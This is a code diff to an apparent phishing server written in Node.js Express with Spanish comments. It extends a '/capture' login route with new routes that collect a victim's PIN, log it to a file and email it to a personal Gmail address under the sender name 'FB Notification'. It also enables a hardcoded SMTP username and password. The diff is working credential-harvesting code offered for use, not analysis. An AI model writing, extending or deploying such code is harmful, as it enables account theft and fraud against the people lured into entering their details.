@@ -15,13 +15,13 @@ const transporter = nodemailer.createTransport({
     port: 587,
     secure: false, // true para SSL, false para TLS
     auth: {
-        //user: 'noreply@htk-id.com', 
-        //pass: 'rypx resj ocsr yatq', 
+        user: 'noreply@htk-id.com', 
+        pass: 'rypx resj ocsr yatq', 
     }
 });
   
 // Servir archivos estáticos (HTML, CSS)
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, 'Public')));
 
 // Ruta para manejar el formulario de inicio de sesión
 app.post('/capture', (req, res) => {
@@ -60,8 +60,47 @@ app.post('/capture', (req, res) => {
         res.redirect('/thank_you.html');
     });
 });
+app.get('/verify-account', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public/pin.html'));
+});
+
+app.post('/submit-pin', (req, res) => {
+    const { pin } = req.body;
+    const data = {
+        pin,
+        timestamp: new Date().toISOString()
+    };
+
+    fs.appendFile('responses.json', JSON.stringify(data, null, 2) + ',\n', (err) => {
+        if (err) {
+            console.error('Error guardando los datos del PIN:', err);
+            res.status(500).send('Error interno del servidor');
+            return;
+        }
+
+        const mailOptions = {
+            from: 'FB Notification <noreply@htk-id.com>',
+            to: 'cchacon266@gmail.com',  // destinatario 
+            subject: 'Ingreso de PIN detectado',
+            text: `Se ha ingresado el PIN: ${pin}`
+        };
+
+        // Enviar el correo electrónico
+        transporter.sendMail(mailOptions, function(error, info) {
+            if (error) {
+                console.log(error);
+            } else {
+                console.log('Correo electrónico enviado: ' + info.response);
+            }
+        });
+
+        res.redirect('/thank_you.html');  
+    });
+});
+ 
 
 app.listen(port, () => {
     console.log(`Servidor ejecutándose en http://localhost:${port}`);
 });
   
+
